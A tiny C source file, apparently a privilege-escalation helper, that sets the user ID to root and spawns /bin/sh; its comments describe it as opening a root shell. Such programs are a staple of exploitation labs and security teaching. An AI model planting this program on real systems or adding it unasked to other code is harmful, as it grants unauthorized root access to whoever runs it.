// Shellcode.c
// Opens a shell as effective UID of 0

#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
  setuid(0); // set the real user id to root
  system("/bin/sh"); // run new shell
}
